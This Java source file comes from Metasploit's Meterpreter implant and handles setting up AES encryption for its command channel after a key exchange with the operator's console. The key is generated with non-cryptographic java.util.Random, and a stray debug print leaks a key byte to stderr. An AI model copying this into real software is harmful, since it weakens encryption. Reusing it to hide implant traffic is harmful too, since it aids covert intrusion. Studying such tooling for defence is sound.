package com.metasploit.meterpreter.core;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.Transport;
import com.metasploit.meterpreter.command.Command;

import java.security.KeyFactory;
import java.security.PublicKey;
import java.security.spec.KeySpec;
import java.security.spec.X509EncodedKeySpec;
import java.util.Random;

import javax.crypto.Cipher;

public class core_negotiate_tlv_encryption implements Command {

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {

        // Generate an AES key
        byte[] aesKey = new byte[32];
        new Random().nextBytes(aesKey);

        // Get the public key
        byte[] publicKeyBytes = request.getRawValue(TLVType.TLV_TYPE_RSA_PUB_KEY);
        KeySpec keySpec = new X509EncodedKeySpec(publicKeyBytes);
        PublicKey publicKey = KeyFactory.getInstance("RSA").generatePublic(keySpec);
        Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
        cipher.init(Cipher.ENCRYPT_MODE, publicKey);

        // Encrypt the AES key with the public key
        byte[] encryptedBytes = cipher.doFinal(aesKey);
        response.add(TLVType.TLV_TYPE_ENC_SYM_KEY, encryptedBytes);
        response.add(TLVType.TLV_TYPE_SYM_KEY_TYPE, Transport.ENC_AES);

        Transport currentTransport = meterpreter.getTransports().current();
        currentTransport.setAESkey(aesKey);
        currentTransport.setEncryptionMode(Transport.ENC_AES);

        System.err.println("ADSF " + aesKey[0]);

        return ERROR_SUCCESS;
    }
}

